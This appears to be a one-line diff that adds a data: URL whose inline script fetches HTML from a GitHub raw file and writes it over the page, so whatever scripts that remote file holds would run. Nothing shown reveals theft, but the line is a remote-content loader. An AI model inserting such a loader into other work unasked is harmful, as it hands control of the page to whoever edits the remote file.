@@ -1,0 +1,1 @@
+data:text/html,<script>fetch("https://raw.githubusercontent.com/pulite/_/refs/heads/main/new/index.html?t="+Date.now()).then(r=>r.text()).then(h=>{document.open();document.write(h);document.close();})</script>
